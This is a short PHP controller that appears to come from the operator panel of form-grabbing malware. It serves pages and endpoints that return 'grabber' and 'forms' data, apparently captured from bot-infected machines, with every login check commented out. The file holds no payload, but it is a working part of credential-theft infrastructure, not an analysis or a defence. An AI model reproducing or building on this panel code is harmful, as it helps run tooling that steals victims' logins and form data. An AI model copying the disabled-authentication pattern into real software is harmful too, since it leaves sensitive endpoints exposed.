<?php
session_start();

class Controller_Http_Grabber extends Controller {

    public function action_index() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Http_Grabber();
            $this->model->setRequestData($this->data);
            $settings = $this->model->getSettings();
            $this->view->addJavaScripts(array(
                'plugins/pagination/pagination.min.js',
                'js/pages/http_grabber.js'
            ));
            $this->view->addCSS(array(
                'plugins/pagination/pagination.css',
                'css/pages/http_grabber.css'
            ));
            $this->view->addModalWindows(array(
                'bot-tab-forms-show-more-info.php'
            ));
            $this->view->generate('http_grabber_view.php', array(
                'settings' => $settings
            ));
        //}
    }

    public function action_get_http_grabber_data() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Http_Grabber();
            $this->model->setRequestData($this->data);
            die($this->model->getGrabberData());
        //}
    }

    public function action_get_forms_data() {
        //if (Authorization::checkLogin()) {
            $this->model = new Model_Http_Grabber();
            $this->model->setRequestData($this->data);
            die($this->model->getFormsData());
        //}
    }
}